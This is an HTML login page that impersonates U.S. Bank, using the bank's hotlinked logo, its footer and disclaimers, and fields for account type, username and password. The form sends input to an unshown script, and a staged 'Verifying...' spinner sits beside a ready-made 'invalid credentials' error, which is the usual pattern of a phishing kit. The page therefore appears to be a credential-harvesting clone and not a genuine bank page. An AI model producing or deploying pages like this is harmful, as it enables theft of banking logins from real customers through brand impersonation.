<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U.S. Bank | Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div id="loader">
    <div class="spinner"></div>
    <p style="margin-top: 20px; font-weight: bold; color: #0c1c3e;">Verifying...</p>
</div>

<header class="header">
    <img src="https://www.usbank.com/etc.clientlibs/ecm-global/clientlibs/clientlib-resources/resources/images/svg/logo-personal.svg" alt="Logo">
</header>

<div class="container">
    <h1>Log in</h1>
    <div id="error-box">Invalid credentials, please try again.</div>
    
    <form id="loginForm">
        <div class="form-group">
            <label>Account type</label>
            <select id="accType">
                <option>Online Banking</option>
                <option>Business Banking</option>
            </select>
        </div>
        <div class="form-group">
            <input type="text" id="user" placeholder="Username" required>
        </div>
        <div class="form-group">
            <input type="password" id="pass" placeholder="Password" required>
        </div>
        <button type="submit" class="action-btn">Log in</button>
    </form>
</div>

<footer class="footer">
    <div class="footer-links">
        <a href="#">Security</a> | <a href="#">Privacy</a> | <a href="#">Legal</a>
    </div>
    <p>© 2026 U.S. Bank. Member FDIC.</p>
    <div class="disclaimer">
        Investment and Insurance products and services: Not a Deposit • Not FDIC Insured • May Lose Value • Not Bank Guaranteed • Not Insured by any Federal Government Agency.
    </div>
</footer>

<script src="script.js"></script>
</body>
</html>
